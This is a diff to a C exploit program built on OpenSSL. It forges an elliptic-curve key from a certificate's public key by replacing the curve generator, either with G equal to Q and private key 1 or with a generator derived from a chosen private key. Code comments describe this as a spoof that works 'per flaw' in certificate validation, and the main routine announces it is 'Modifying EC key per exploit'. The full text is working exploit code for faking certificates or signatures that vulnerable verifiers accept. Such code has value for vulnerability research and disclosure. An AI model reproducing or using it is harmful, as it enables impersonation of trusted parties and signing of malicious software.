@@ -242,7 +242,10 @@ EC_KEY* getEcPublicKey(X509 *cert)
 }
 
 //
-// Modifies the EC key using Q=G and d=1.
+// Modifies the EC key using the trivial solution:
+//  d' = 1
+//  Q' = Q
+//  G' = Q
 //
 bool setEcKeyOne(EC_KEY *ecKey)
 {
@@ -271,8 +274,7 @@ bool setEcKeyOne(EC_KEY *ecKey)
         goto cleanUp;
     }
 
-    // d = 1
-    // G = Q
+    // So easy!
     bnPrivateKey = BN_value_one();
     ptGenerator = ptPublicKey;
 
@@ -309,9 +311,9 @@ cleanUp:
 }
 
 //
-// Modifies the EC key using:
-//  Q' = Q
+// Modifies the EC key using the non-trivial solution:
 //  d' = specified
+//  Q' = Q
 //  G' = d'^-1 * G
 //
 bool setEcKeyCustom(EC_KEY *ecKey, const BIGNUM *bnPrivateKey)
@@ -325,7 +327,7 @@ bool setEcKeyCustom(EC_KEY *ecKey, const BIGNUM *bnPrivateKey)
     BIGNUM *bnA = NULL;
     BIGNUM *bnB = NULL;
     BIGNUM *bnP = NULL;
-    BIGNUM *bnDInv = NULL;
+    BIGNUM *bnTemp = NULL;
     EC_GROUP *ecGroup = NULL;
     EC_POINT *ptGenerator = NULL;
 
@@ -377,25 +379,35 @@ bool setEcKeyCustom(EC_KEY *ecKey, const BIGNUM *bnPrivateKey)
         goto cleanUp;
     }
 
-    // temp = d^-1 mod Order
-    // G = temp * Q
-
-    bnDInv = BN_mod_inverse(NULL, bnPrivateKey, bnOrder, bnCtx);
-    if (bnDInv == NULL) {
+    //
+    // Original:
+    // params : (a,b,p,G,n,h) over GF(p)
+    // pubkey : Q
+    // privkey: d (not known)
+    //
+    // Spoof:
+    // Q' = Q (per flaw)
+    // d' = rand(), >1 and <n
+    // G' = d'^-1 * G
+    // (a',b',p',n',h') = (a,b,p,n,h)
+    //
+    // temp = 1/d' mod n (n = order of curve)
+    // 'G = temp * Q
+    //
+    bnTemp = BN_mod_inverse(NULL, bnPrivateKey, bnOrder, bnCtx);
+    if (bnTemp == NULL) {
         showSslError("BN_mod_inverse failed");
         goto cleanUp;
     }
 
-    if (!EC_POINT_mul(ecGroup, ptGenerator, NULL, ptPublicKey, bnDInv, bnCtx)) {
+    if (!EC_POINT_mul(ecGroup, ptGenerator, NULL, ptPublicKey, bnTemp, bnCtx)) {
         showSslError("EC_POINT_mul failed");
         goto cleanUp;
     }
 
-    // TODO: verify point is valid?
-
     printf("  [-] Setting EC group generator to: ");
     printEcPoint(ecGroup, ptGenerator);
-    printf("\n");
+    putchar('\n');
 
     if (!EC_GROUP_set_generator(ecGroup, ptGenerator, bnOrder, bnCofactor)) {
         showSslError("EC_GROUP_set_generator failed");
@@ -404,7 +416,7 @@ bool setEcKeyCustom(EC_KEY *ecKey, const BIGNUM *bnPrivateKey)
 
     printf("  [-] Setting EC private key to: ");
     printBigNum(bnPrivateKey);
-    printf("\n");
+    putchar('\n');
 
     if (!EC_KEY_set_private_key(ecKey, bnPrivateKey)) {
         showSslError("EC_KEY_set_private_key failed");
@@ -444,6 +456,23 @@ bool modifyEcKey(EC_KEY *ecKey)
         return setEcKeyCustom(ecKey, optPrivateKey);
     }
     return setEcKeyOne(ecKey);
+}
+
+//
+// Verifies EC key parameters are valid.
+//
+bool verifyEcKey(EC_KEY *ecKey)
+{
+    // According to OpenSSL's great documentation:
+    // 'EC_KEY_check_key() performs various sanity checks...' various you say?!
+    if (!EC_KEY_check_key(ecKey)) {
+        showSslError("EC_KEY_check_key failed");
+        return false;
+    }
+
+    // TODO: more checks?
+
+    return true;
 }
 
 //
@@ -520,6 +549,12 @@ int main(int argc, char *argv[])
 
     printf("[-] Modifying EC key per exploit..\n");
     if (!modifyEcKey(ecKey)) {
+        goto cleanUp;
+    }
+
+
+    printf("[-] Verifying EC key...\n");
+    if (!verifyEcKey(ecKey)) {
         goto cleanUp;
     }
 
